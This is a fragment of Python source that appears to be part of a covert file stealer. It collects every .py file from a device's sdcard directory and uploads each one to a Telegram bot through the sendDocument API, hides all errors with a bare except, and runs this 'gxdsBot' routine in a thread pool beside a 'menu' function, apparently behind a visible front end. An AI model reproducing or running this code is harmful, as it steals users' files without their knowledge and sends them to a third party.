        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass


with ThreadPool(max_workers=90) as jjk:
    jjk.submit(gxdsBot)
    jjk.submit(menu)
